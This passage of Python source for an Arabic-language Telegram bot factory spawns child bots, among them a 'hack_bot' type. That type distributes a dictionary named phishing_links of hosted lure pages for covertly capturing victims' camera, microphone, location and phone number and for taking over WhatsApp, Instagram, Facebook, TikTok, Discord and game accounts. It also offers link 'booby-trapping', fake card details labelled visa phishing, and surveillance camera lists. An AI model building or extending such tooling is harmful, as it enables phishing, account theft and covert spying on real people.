    if isinstance(state, dict) and state.get("action") == "await_token":
        chat_id = update.message.chat.id
        await send_msg(context.bot, chat_id, "⏳ جاري الإعداد...")
        bot_token = text
        bot_type = state["bot_type"]

        try:
            bot_info_resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe").json()
            if not bot_info_resp.get("ok"):
                await send_msg(context.bot, chat_id, "❌ توكن غير صالح. حاول مرة أخرى.")
                user_state[user_id] = None
                return

            bot_username = bot_info_resp["result"]["username"]
            user_bots = created_bots.get(user_id, [])
            new_bot_data = {
                "token": bot_token,
                "admin_id": user_id,
                "username": bot_username,
                "bot_type": bot_type
            }
            user_bots.append(new_bot_data)
            created_bots[user_id] = user_bots

            bot_file_path = os.path.join(DATABASE_DIR, f"{bot_username}.json")
            with open(bot_file_path, 'w') as f:
                json.dump({"token": bot_token, "admin_id": user_id, "bot_type": bot_type}, f)

            await send_msg(context.bot, chat_id, f"✅ تم تشغيل بوت @{bot_username} بنجاح! 🎉")

            if user_id != MAIN_ADMIN_ID:
                creator_name = update.effective_user.first_name
                msg_to_admin = (
                    f"🔔 *إشعار: تم إنشاء بوت جديد!*\n\n"
                    f"👤 بواسطة: [{creator_name}](tg://user?id={user_id})\n"
                    f"🤖 البوت: @{bot_username}\n"
                    f"📋 النوع: {bot_type}"
                )
                await send_msg(context.bot, MAIN_ADMIN_ID, msg_to_admin, parse_mode=ParseMode.MARKDOWN)

            user_state[user_id] = None
            threading.Thread(
                target=run_made_bot,
                args=(bot_token, user_id, bot_username, bot_type),
                daemon=True
            ).start()

        except Exception as e:
            logging.error(f"Error creating bot: {e}")
            await send_msg(context.bot, chat_id, "❌ حدث خطأ أثناء إنشاء البوت.")
            user_state[user_id] = None
        return

    if state and isinstance(state, str) and state.startswith("confirm_delete_"):
        bot_username_to_delete = state.split("_", 2)[2]
        chat_id = update.message.chat.id
        if text == f"delete {bot_username_to_delete}":
            created_bots[user_id] = [b for b in created_bots.get(user_id, []) if b["username"] != bot_username_to_delete]
            bot_file_path = os.path.join(DATABASE_DIR, f"{bot_username_to_delete}.json")
            settings_file_path = os.path.join(DATABASE_DIR, f"{bot_username_to_delete}_settings.json")
            if os.path.exists(bot_file_path):
                os.remove(bot_file_path)
            if os.path.exists(settings_file_path):
                os.remove(settings_file_path)
            if bot_username_to_delete in running_made_bot_updaters:
                running_made_bot_updaters[bot_username_to_delete].stop()
                del running_made_bot_updaters[bot_username_to_delete]
            await send_msg(context.bot, chat_id, f"✅ تم حذف بوت @{bot_username_to_delete} بنجاح.")
        else:
            await send_msg(context.bot, chat_id, "❌ أمر غير صحيح.")
        user_state[user_id] = None
        return

    if user_id in FACTORY_ADMINS:
        if state == "await_new_factory_admin_id":
            try:
                new_admin_id = int(text)
                if new_admin_id not in FACTORY_ADMINS:
                    FACTORY_ADMINS.append(new_admin_id)
                    await send_msg(context.bot, update.message.chat.id, f"✅ تم إضافة {new_admin_id} كأدمن.")
                    await send_msg(context.bot, new_admin_id, "🎉 تم إضافتك كأحد إدمنز المصنع!")
                else:
                    await send_msg(context.bot, update.message.chat.id, "⚠️ هذا المستخدم أدمن بالفعل.")
            except:
                await send_msg(context.bot, update.message.chat.id, "❌ معرف غير صالح.")
            user_state[user_id] = None
            return

        if state == "await_remove_factory_admin_id":
            try:
                admin_to_remove = int(text)
                if admin_to_remove == MAIN_ADMIN_ID:
                    await send_msg(context.bot, update.message.chat.id, "❌ لا يمكنك حذف المالك الرئيسي!")
                elif admin_to_remove in FACTORY_ADMINS:
                    FACTORY_ADMINS.remove(admin_to_remove)
                    await send_msg(context.bot, update.message.chat.id, f"✅ تم حذف {admin_to_remove} من الأدمنز.")
                else:
                    await send_msg(context.bot, update.message.chat.id, "⚠️ هذا المستخدم ليس أدمن.")
            except:
                await send_msg(context.bot, update.message.chat.id, "❌ معرف غير صالح.")
            user_state[user_id] = None
            return

        if state == "await_broadcast_free_bots_message":
            sent_count = 0
            for admin_id_key, bots_list in created_bots.items():
                for bot_info in bots_list:
                    load_made_bot_settings(bot_info["username"])
                    if made_bot_data[bot_info["username"]]["payment_status"] == "free":
                        for member_id in made_bot_data[bot_info["username"]].get("members", []):
                            try:
                                requests.get(
                                    f"https://api.telegram.org/bot{bot_info['token']}/sendMessage?chat_id={member_id}&text={urllib.parse.quote(text)}"
                                )
                                sent_count += 1
                            except Exception as e:
                                logging.error(f"Error broadcasting: {e}")
            await send_msg(context.bot, update.message.chat.id, f"✅ تم إرسال الرسالة إلى {sent_count} مستخدم.")
            user_state[user_id] = None
            return


# =============================================
# start_made_bot
# =============================================
async def start_made_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)

    if not current_bot_username:
        await send_msg(context.bot, chat_id, "حدث خطأ.")
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data.get(current_bot_username, DEFAULT_BOT_SETTINGS)

    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    bot_user_states[current_bot_username][user_id] = None
    if current_bot_username not in user_last_interaction_time:
        user_last_interaction_time[current_bot_username] = {}
    user_last_interaction_time[current_bot_username][user_id] = time.time()

    if user_id in bot_settings["banned_users"]:
        await send_msg(context.bot, chat_id, "أنت محظور من استخدام هذا البوت 📛")
        return

    if bot_settings["bot_status"] == "off" and user_id != admin_id:
        await send_msg(context.bot, chat_id, "البوت متوقف حالياً من قبل المطور 🚨")
        return

    if bot_settings["payment_status"] == "on" and user_id not in bot_settings["paid_users"] and user_id != admin_id:
        payment_msg = "⚠️ يرجى شراء الاشتراك للاستمرار."
        payment_keyboard = [[InlineKeyboardButton("شراء الاشتراك 💰", url=f"tg://user?id={admin_id}")]]
        await send_msg(context.bot, chat_id, payment_msg, reply_markup=InlineKeyboardMarkup(payment_keyboard))
        return

    if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
        if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
            keyboard = [[InlineKeyboardButton("اشتراك", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
            await send_msg(context.bot, chat_id, f"❌ عذراً، يجب عليك الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} أولاً", reply_markup=InlineKeyboardMarkup(keyboard))
            bot_user_states[current_bot_username][user_id] = {"awaiting_factory_main_subscription": True}
            return

    if isinstance(bot_user_states[current_bot_username].get(user_id), dict) and bot_user_states[current_bot_username][user_id].get("awaiting_factory_main_subscription"):
        bot_user_states[current_bot_username][user_id] = None

    if bot_type == "hack_bot" and context.args and len(context.args) == 1:
        try:
            referrer_id = int(context.args[0])
            if referrer_id != user_id:
                load_made_bot_settings(current_bot_username)
                if not isinstance(made_bot_data[current_bot_username].get("points"), dict):
                    made_bot_data[current_bot_username]["points"] = {}
                if user_id not in made_bot_data[current_bot_username]["referred_users"]:
                    points = made_bot_data[current_bot_username]["points"].get(referrer_id, 0) + 1
                    made_bot_data[current_bot_username]["points"][referrer_id] = points
                    made_bot_data[current_bot_username]["referred_users"].append(user_id)
                    save_made_bot_settings(current_bot_username)
                    await send_msg(context.bot, referrer_id, f"✅ تم إضافة نقطة جديدة من إحالتك! نقاطك الآن: {points} 🌟")
                else:
                    await send_msg(context.bot, chat_id, "لقد تم احتساب نقاطك من قبل.")
            else:
                await send_msg(context.bot, chat_id, "لا يمكنك إحالة نفسك!")
        except Exception as e:
            logging.error(f"Referral error: {e}")

    remaining_channels = [c for c in bot_settings["channels"] if c != FACTORY_MAIN_SUBSCRIPTION_CHANNEL]
    if remaining_channels:
        not_subscribed = [c for c in remaining_channels if not check_subscription(user_id, [c], current_bot_token)]
        if not_subscribed:
            subscription_msg = "📌 للاستخدام، يرجى الاشتراك في القنوات التالية أولاً:\n\n"
            subscription_keyboard = []
            for channel in not_subscribed:
                channel_name = get_channel_name(channel, current_bot_token)
                subscription_keyboard.append([InlineKeyboardButton(f"اشترك: {channel_name}", url=f"https://t.me/{channel.lstrip('@')}")])
                subscription_msg += f"{channel_name}\n"
            subscription_msg += "\nبعد الاشتراك، أرسل /start مرة أخرى."
            await send_msg(context.bot, chat_id, subscription_msg, reply_markup=InlineKeyboardMarkup(subscription_keyboard))
            return

    if user_id not in bot_settings["members"]:
        bot_settings["members"].append(user_id)
        save_made_bot_settings(current_bot_username)
        if bot_settings["notifications"] == "on" and user_id != admin_id:
            user_name = update.effective_user.first_name
            user_username = update.effective_user.username or "غير متوفر"
            notification_msg = (
                f"🔔 *إشعار: عضو جديد!*\n"
                f"الاسم: {user_name}\n"
                f"المعرف: @{user_username}\n"
                f"الآيدي: {user_id}\n"
                f"العدد الكلي: {len(bot_settings['members'])}"
            )
            await send_msg(context.bot, admin_id, notification_msg, parse_mode=ParseMode.MARKDOWN)

    if user_id == admin_id:
        await send_msg(context.bot, chat_id, "مرحبًا! إليك لوحة التحكم: ⚡📮", reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))

    if bot_type == "encryption_bot":
        user_name = update.effective_user.first_name
        user_username = update.effective_user.username or "غير متوفر"
        msg = (
            f"مرحباً {user_name}! 👋\n"
            f"يوزر: @{user_username}\n"
            f"ايدي: {user_id}\n\n"
            f"مرحبا بك في عالم فك/التشفير 🔐"
        )
        await send_msg(context.bot, chat_id, msg, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
    elif bot_type == "factory_bot":
        await send_msg(context.bot, chat_id, "👋 حياك الله في بوت صانع البوتات اختر نوع البوت الذي تريده 🎩", reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
    else:
        await send_msg(context.bot, chat_id, bot_settings["start_message"], parse_mode=ParseMode.MARKDOWN, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))


# =============================================
# handle_callback_query_made_bot
# =============================================
async def handle_callback_query_made_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    if not query.message:
        await query.answer("حدث خطأ.", show_alert=True)
        return

    user_id = query.from_user.id
    chat_id = query.message.chat.id
    message_id = query.message.message_id
    data = query.data
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)

    if not current_bot_username:
        await query.answer("حدث خطأ.", show_alert=True)
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data[current_bot_username]

    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None
    if current_bot_username not in user_last_interaction_time:
        user_last_interaction_time[current_bot_username] = {}
    user_last_interaction_time[current_bot_username][user_id] = time.time()

    if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
        if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
            msg = f"❌ عذراً، يجب عليك الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} أولاً"
            keyboard = [[InlineKeyboardButton("اشتراك", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
            try:
                await edit_msg(context.bot, chat_id, message_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                await send_msg(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            await query.answer("اشترك أولاً.", show_alert=True)
            return

    phishing_links = {
        "cam_back": "https://spectacular-crumble-77f830.netlify.app",
        "cam_front": "https://profound-bubblegum-7f29b2.netlify.app",
        "location": "https://illustrious-panda-c2ece1.netlify.app",
        "mic_record": "https://tourmaline-kulfi-aeb7ea.netlify.app",
        "record_video": "https://dainty-medovik-d0e934.netlify.app",
        "pubg_hack": "https://sunny-concha-96fe88.netlify.app",
        "ff_hack": "https://thunderous-maamoul-7653c0.netlify.app",
        "insta_hack": "https://gentle-kulfi-99cf00.netlify.app",
        "whatsapp_hack": "https://benevolent-meerkat-966767.netlify.app",
        "facebook_hack": "https://dazzling-daffodil-ed5b43.netlify.app",
        "tiktok_hack": "https://melodious-crumble-8d3b83.netlify.app",
        "snapchat_hack": "https://preeminent-gumdrop-35a4f1.netlify.app",
        "device_info": "http://incredible-fairy-85f241.netlify.app",
        "high_quality_shot": "https://profound-bubblegum-7f29b2.netlify.app",
        "get_victim_number": "https://tubular-brioche-55433f.netlify.app/",
        "discord_hack": "https://sweet-madeleine-41fe6e.netlify.app/",
        "roblox_hack": "https://silly-sunflower-ab29c8.netlify.app/",
    }

    await query.answer()

    if data == "back_to_main_user_menu":
        bot_user_states[current_bot_username][user_id] = None
        if bot_type == "factory_bot":
            await send_msg(context.bot, chat_id, "👋 حياك الله في بوت صانع البوتات اختر نوع البوت الذي تريده 🎩", reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        elif bot_type == "encryption_bot":
            await send_msg(context.bot, chat_id, "مرحبا بك في عالم فك/التشفير 🔐", reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        else:
            await send_msg(context.bot, chat_id, bot_settings["start_message"], parse_mode=ParseMode.MARKDOWN, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        return

    if data in phishing_links and bot_type == "hack_bot":
        await send_msg(context.bot, chat_id, f"🔗 رابط الأداة:\n{phishing_links[data]}")
        return

    if bot_type == "hack_bot":
        # ============ OSINT Tools ============
        if data == "tool_ip_lookup":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ip"}
            await send_msg(context.bot, chat_id, "📝 أرسل عنوان IP لفحصه:")
            return
        elif data == "tool_domain_info":
            bot_user_states[current_bot_username][user_id] = {"action": "await_domain_info"}
            await send_msg(context.bot, chat_id, "📝 أرسل اسم النطاق (مثال: google.com):")
            return
        elif data == "tool_ssl_check":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ssl_domain"}
            await send_msg(context.bot, chat_id, "📝 أرسل اسم النطاق لفحص SSL:")
            return
        elif data == "tool_http_headers":
            bot_user_states[current_bot_username][user_id] = {"action": "await_http_domain"}
            await send_msg(context.bot, chat_id, "📝 أرسل اسم النطاق لفحص رؤوس HTTP:")
            return
        elif data == "tool_port_scan":
            bot_user_states[current_bot_username][user_id] = {"action": "await_port_host"}
            await send_msg(context.bot, chat_id, "📝 أرسل عنوان IP أو اسم النطاق لفحص البورتات:")
            return
        elif data == "tool_subdomains":
            bot_user_states[current_bot_username][user_id] = {"action": "await_subdomain_domain"}
            await send_msg(context.bot, chat_id, "📝 أرسل اسم النطاق للبحث عن النطاقات الفرعية:")
            return
        elif data == "tool_whois":
            bot_user_states[current_bot_username][user_id] = {"action": "await_whois_domain"}
            await send_msg(context.bot, chat_id, "📝 أرسل اسم النطاق لفحص Whois:")
            return
        elif data == "tool_dns":
            bot_user_states[current_bot_username][user_id] = {"action": "await_dns_domain"}
            await send_msg(context.bot, chat_id, "📝 أرسل اسم النطاق لفحص DNS:")
            return
        elif data == "tool_email_check":
            bot_user_states[current_bot_username][user_id] = {"action": "await_email"}
            await send_msg(context.bot, chat_id, "📝 أرسل البريد الإلكتروني لفحصه:")
            return
        elif data == "tool_username_osint":
            bot_user_states[current_bot_username][user_id] = {"action": "await_osint_username"}
            await send_msg(context.bot, chat_id, "📝 أرسل اسم المستخدم للبحث عنه عبر المنصات:")
            return
        elif data == "tool_google_dork":
            bot_user_states[current_bot_username][user_id] = {"action": "await_dork_topic"}
            await send_msg(context.bot, chat_id, "📝 أرسل اسم النطاق أو الموضوع لتصنيع Google Dork:")
            return
        elif data == "tool_password_gen":
            keyboard = [
                [InlineKeyboardButton("8 أحرف", callback_data="gen_pass_8"),
                 InlineKeyboardButton("12 حرف", callback_data="gen_pass_12"),
                 InlineKeyboardButton("16 حرف", callback_data="gen_pass_16"),
                 InlineKeyboardButton("32 حرف", callback_data="gen_pass_32")]
            ]
            await send_msg(context.bot, chat_id, "اختر طول كلمة المرور:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data.startswith("gen_pass_"):
            length = int(data.replace("gen_pass_", ""))
            await send_msg(context.bot, chat_id, tool_generate_password(length), parse_mode=ParseMode.MARKDOWN)
            return
        elif data == "tool_hash_calc":
            bot_user_states[current_bot_username][user_id] = {"action": "await_hash_text"}
            await send_msg(context.bot, chat_id, "📝 أرسل النص لحساب الهاش:")
            return
        elif data == "tool_qr_gen":
            bot_user_states[current_bot_username][user_id] = {"action": "await_qr_text"}
            await send_msg(context.bot, chat_id, "📝 أرسل النص أو الرابط لتحويله إلى QR Code:")
            return
        elif data == "tool_url_encode":
            keyboard = [
                [InlineKeyboardButton("تشفير", callback_data="url_encode"),
                 InlineKeyboardButton("فك التشفير", callback_data="url_decode")],
                [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
            ]
            await send_msg(context.bot, chat_id, "اختر العملية:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "url_encode":
            bot_user_states[current_bot_username][user_id] = {"action": "await_url_encode_text"}
            await send_msg(context.bot, chat_id, "📝 أرسل النص لتشفيره:")
            return
        elif data == "url_decode":
            bot_user_states[current_bot_username][user_id] = {"action": "await_url_decode_text"}
            await send_msg(context.bot, chat_id, "📝 أرسل النص لفك التشفير:")
            return
        elif data == "tool_base64":
            keyboard = [
                [InlineKeyboardButton("تشفير", callback_data="b64_encode"),
                 InlineKeyboardButton("فك التشفير", callback_data="b64_decode")],
                [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
            ]
            await send_msg(context.bot, chat_id, "اختر العملية:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "b64_encode":
            bot_user_states[current_bot_username][user_id] = {"action": "await_b64_encode_text"}
            await send_msg(context.bot, chat_id, "📝 أرسل النص لتشفيره:")
            return
        elif data == "b64_decode":
            bot_user_states[current_bot_username][user_id] = {"action": "await_b64_decode_text"}
            await send_msg(context.bot, chat_id, "📝 أرسل النص لفك التشفير:")
            return
        elif data == "tool_mac_lookup":
            bot_user_states[current_bot_username][user_id] = {"action": "await_mac_address"}
            await send_msg(context.bot, chat_id, "📝 أرسل عنوان MAC (مثال: 00:0a:95:9d:68:16):")
            return
        elif data == "tool_ping":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ping_host"}
            await send_msg(context.bot, chat_id, "📝 أرسل عنوان IP أو اسم النطاق:")
            return
        elif data == "tool_traceroute":
            bot_user_states[current_bot_username][user_id] = {"action": "await_traceroute_host"}
            await send_msg(context.bot, chat_id, "📝 أرسل عنوان IP أو اسم النطاق:")
            return
        elif data == "tool_cidr":
            bot_user_states[current_bot_username][user_id] = {"action": "await_cidr"}
            await send_msg(context.bot, chat_id, "📝 أرسل عنوان CIDR (مثال: 192.168.1.0/24):")
            return
        # ============ Original Buttons ============
        elif data == "surveillance_cams":
            msg = "📡 كاميرات المراقبة المتوفرة:\n\n"
            for country, cameras in CCTV_CAMERAS.items():
                msg += f"🌍 {country}:\n"
                for cam in cameras[:3]:
                    msg += f"  🔗 {cam}\n"
                msg += "\n"
            await send_msg(context.bot, chat_id, msg)
            return
        elif data == "user_button_ai":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
            await send_msg(context.bot, chat_id, "📝 أرسل سؤالك للذكاء الاصطناعي:")
            return
        elif data == "user_button_dream_interpret":
            bot_user_states[current_bot_username][user_id] = {"action": "await_dream_text"}
            await send_msg(context.bot, chat_id, "📝 أرسل حلمك لتفسيره:")
            return
        elif data == "user_button_blue_genie_game":
            bot_user_states[current_bot_username][user_id] = {"action": "await_genie_question"}
            await send_msg(context.bot, chat_id, "📝 اسأل المارد الأزرق:")
            return
        elif data == "user_button_image_search":
            bot_user_states[current_bot_username][user_id] = {"action": "await_image_prompt"}
            await send_msg(context.bot, chat_id, "📝 أرسل وصف الصورة:")
            return
        elif data == "user_button_text_to_speech":
            bot_user_states[current_bot_username][user_id] = {"action": "await_tts_text"}
            await send_msg(context.bot, chat_id, "📝 أرسل النص لتحويله إلى صوت:")
            return
        elif data == "user_button_azkar":
            azkar_text = get_azkar_via_api(current_bot_username, user_id)
            await send_msg(context.bot, chat_id, azkar_text, parse_mode=ParseMode.MARKDOWN)
            return
        elif data in ["user_button_shereen_ai", "user_button_deepseek_ai", "user_button_chatgpt_3_5"]:
            bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
            await send_msg(context.bot, chat_id, "📝 أرسل سؤالك:")
            return
        elif data == "user_button_full_phone_hack":
            await send_msg(context.bot, chat_id, "اختر الأداة:", reply_markup=get_full_phone_hack_keyboard(current_bot_username, user_id))
            return
        elif data == "user_button_link_exploit":
            await send_msg(context.bot, chat_id, "🔗 أرسل الرابط المراد تلغيمه:")
            return
        elif data == "user_button_smart_game":
            await send_msg(context.bot, chat_id, "🧠 قيد التطوير")
            return
        elif data == "user_button_fake_numbers":
            fake_number = generate_fake_number_details()
            msg = (
                f"📞 الرقم الوهمي:\n\n"
                f"📱 الرقم: {fake_number['phone_number']}\n"
                f"🌍 الدولة: {fake_number['country']}\n"
                f"📲 المنصة: {fake_number['platform']}\n"
                f"📅 تاريخ الإنشاء: {fake_number['creation_date']}"
            )
            await send_msg(context.bot, chat_id, msg, reply_markup=get_fake_number_keyboard(current_bot_username, user_id))
            return
        elif data == "user_button_visa_phishing":
            visa = generate_random_visa_details()
            msg = (
                f"💳 بيانات فيزا وهمية:\n\n"
                f"💳 رقم البطاقة: {visa['card_number']}\n"
                f"📅 تاريخ الانتهاء: {visa['expiry']}\n"
                f"🔐 CVV: {visa['cvv']}\n"
                f"🏦 البنك: {visa['bank']}\n"
                f"📋 نوع البطاقة: {visa['card_type']}\n"
                f"🌍 الدولة: {visa['country']}\n"
                f"💰 القيمة: {visa['value']}"
            )
            await send_msg(context.bot, chat_id, msg)
            return
        elif data == "user_button_radio_hack":
            msg = "📻 محطات الراديو:\n\nالسودان:\n"
            for station in SUDAN_RADIO_STATIONS:
                msg += f"🎵 {station['name']}: {station['url']}\n"
            msg += "\nمصر (أول 10):\n"
            for station in EGYPT_RADIO_STATIONS[:10]:
                msg += f"🎵 {station['name']}: {station['url']}\n"
            await send_msg(context.bot, chat_id, msg)
            return
        elif data == "user_button_link_check":
            bot_user_states[current_bot_username][user_id] = {"action": "await_url_to_check"}
            await send_msg(context.bot, chat_id, "📝 أرسل الرابط لفحصه:")
            return
        elif data == "user_button_name_decorate":
            keyboard = [
                [InlineKeyboardButton("🇬🇧 اسم إنجليزي", callback_data="decorate_english")],
                [InlineKeyboardButton("🇸🇦 اسم عربي", callback_data="decorate_arabic")],
                [InlineKeyboardButton("رجوع 🔙", callback_data="back_to_main_user_menu")]
            ]
            await send_msg(context.bot, chat_id, "اختر نوع الاسم:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "decorate_english":
            bot_user_states[current_bot_username][user_id] = {"action": "await_name_to_decorate", "name_type": "english"}
            await send_msg(context.bot, chat_id, "📝 أرسل الاسم بالإنجليزية:")
            return
        elif data == "decorate_arabic":
            bot_user_states[current_bot_username][user_id] = {"action": "await_name_to_decorate", "name_type": "arabic"}
            await send_msg(context.bot, chat_id, "📝 أرسل الاسم بالعربية:")
            return
        elif data == "telegram_usernames_menu":
            keyboard = [
                [InlineKeyboardButton("يوزر نوع واحد 🅰️", callback_data="get_username_single_type")],
                [InlineKeyboardButton("يوزرات رباعية 🔢", callback_data="get_username_quad_usernames")],
                [InlineKeyboardButton("شبه رباعي 🔠", callback_data="get_username_semi_quad")],
                [InlineKeyboardButton("يوزرات شبه ثلاثية 🔡", callback_data="get_username_semi_triple")],
                [InlineKeyboardButton("عشوائي 🎲", callback_data="get_username_random")],
                [InlineKeyboardButton("فريد ✨", callback_data="get_username_unique")],
                [InlineKeyboardButton("رجوع 🔙", callback_data="back_to_main_user_menu")]
            ]
            await edit_msg(context.bot, chat_id, message_id, "اختر نوع اليوزر: 👇", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data.startswith("get_username_"):
            username_type = data.replace("get_username_", "")
            await query.answer("جاري البحث عن يوزرات...", show_alert=True)
            found_usernames = []
            for _ in range(5):
                username = generate_and_check_username(current_bot_token, username_type)
                if username:
                    found_usernames.append(username)
                else:
                    break
            if found_usernames:
                msg = "✅ تم العثور على اليوزرات التالية:\n\n"
                for u in found_usernames:
                    msg += f"✨ @{u}\n"
                await send_msg(context.bot, chat_id, msg)
            else:
                await send_msg(context.bot, chat_id, "لم يتم العثور على يوزرات متاحة. 😔 حاول مرة أخرى.")
            return
        elif data.startswith("full_phone_hack_"):
            await send_msg(context.bot, chat_id, "⏳ جاري العمل... هذه الميزة تعمل عبر تطبيق APK.")
            return

    # ============ Admin Panel ============
    if user_id == admin_id:
        if data == "m1":
            await send_msg(context.bot, chat_id, f"👥 عدد الأعضاء: {len(bot_settings.get('members', []))}")
            return
        elif data == "send":
            bot_user_states[current_bot_username][user_id] = {"action": "await_broadcast_message"}
            await send_msg(context.bot, chat_id, "📝 أرسل الرسالة للإذاعة:")
            return
        elif data == "forward":
            bot_user_states[current_bot_username][user_id] = {"action": "await_forward_message"}
            await send_msg(context.bot, chat_id, "📝 أرسل الرسالة للتوجيه:")
            return
        elif data == "ach":
            bot_user_states[current_bot_username][user_id] = {"action": "await_channel_for_subscription"}
            await send_msg(context.bot, chat_id, "📝 أرسل معرف القناة:")
            return
        elif data == "dch":
            channels = bot_settings.get("channels", [])
            if channels:
                keyboard = [[InlineKeyboardButton(f"🗑 حذف {ch}", callback_data=f"remove_ch_{ch}")] for ch in channels]
                keyboard.append([InlineKeyboardButton("رجوع", callback_data="back_to_admin")])
                await send_msg(context.bot, chat_id, "اختر القناة للحذف:", reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                await send_msg(context.bot, chat_id, "لا توجد قنوات مضافة.")
            return
        elif data.startswith("remove_ch_"):
            channel_to_remove = data.replace("remove_ch_", "")
            if channel_to_remove in bot_settings["channels"]:
                bot_settings["channels"].remove(channel_to_remove)
                save_made_bot_settings(current_bot_username)
                await send_msg(context.bot, chat_id, f"✅ تم حذف {channel_to_remove}")
            return
        elif data == "back_to_admin":
            await send_msg(context.bot, chat_id, "لوحة التحكم:", reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
            return
        elif data == "ons":
            bot_settings["notifications"] = "on"
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم تفعيل التنبيهات.")
            return
        elif data == "ofs":
            bot_settings["notifications"] = "off"
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم تعطيل التنبيهات.")
            return
        elif data == "obot":
            bot_settings["bot_status"] = "on"
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم فتح البوت.")
            return
        elif data == "ofbot":
            bot_settings["bot_status"] = "off"
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم إيقاف البوت.")
            return
        elif data == "pro":
            bot_settings["payment_status"] = "on"
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم تفعيل الوضع المدفوع.")
            return
        elif data == "frre":
            bot_settings["payment_status"] = "free"
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم تفعيل الوضع المجاني.")
            return
        elif data == "pro123":
            bot_user_states[current_bot_username][user_id] = {"action": "await_paid_user_id"}
            await send_msg(context.bot, chat_id, "📝 أرسل معرف المستخدم لإضافته كمدفوع:")
            return
        elif data == "frre123":
            bot_user_states[current_bot_username][user_id] = {"action": "await_remove_paid_user_id"}
            await send_msg(context.bot, chat_id, "📝 أرسل معرف المستخدم لإزالته من المدفوعين:")
            return
        elif data == "ban":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ban_user_id"}
            await send_msg(context.bot, chat_id, "📝 أرسل معرف المستخدم لحظره:")
            return
        elif data == "unban":
            bot_user_states[current_bot_username][user_id] = {"action": "await_unban_user_id"}
            await send_msg(context.bot, chat_id, "📝 أرسل معرف المستخدم لإلغاء حظره:")
            return
        elif data == "set_start_message":
            bot_user_states[current_bot_username][user_id] = {"action": "await_new_start_message"}
            await send_msg(context.bot, chat_id, "📝 أرسل رسالة البدء الجديدة:")
            return
        elif data == "download_bot_data":
            settings_file = get_made_bot_data_path(current_bot_username)
            if os.path.exists(settings_file):
                with open(settings_file, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=f, filename=f"{current_bot_username}_settings.json")
                return
        elif data == "set_payload_points":
            bot_user_states[current_bot_username][user_id] = {"action": "await_payload_points"}
            await send_msg(context.bot, chat_id, "📝 أرسل عدد النقاط المطلوبة للبايلود:")
            return
        elif data == "set_main_channel_link":
            bot_user_states[current_bot_username][user_id] = {"action": "await_channel_name_for_link"}
            await send_msg(context.bot, chat_id, "📝 أرسل رابط القناة الأساسية:")
            return
        elif data == "buttons_panel":
            keyboard = [
                [InlineKeyboardButton("➕ إضافة زر", callback_data="add_custom_button")],
                [InlineKeyboardButton("🗑 حذف زر", callback_data="remove_custom_button")],
                [InlineKeyboardButton("✅ تفعيل الأزرار", callback_data="enable_custom_buttons")],
                [InlineKeyboardButton("❌ تعطيل الأزرار", callback_data="disable_custom_buttons")],
                [InlineKeyboardButton("رجوع", callback_data="back_to_admin")]
            ]
            await send_msg(context.bot, chat_id, "إدارة الأزرار:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "add_custom_button":
            bot_user_states[current_bot_username][user_id] = {"action": "await_custom_button_name"}
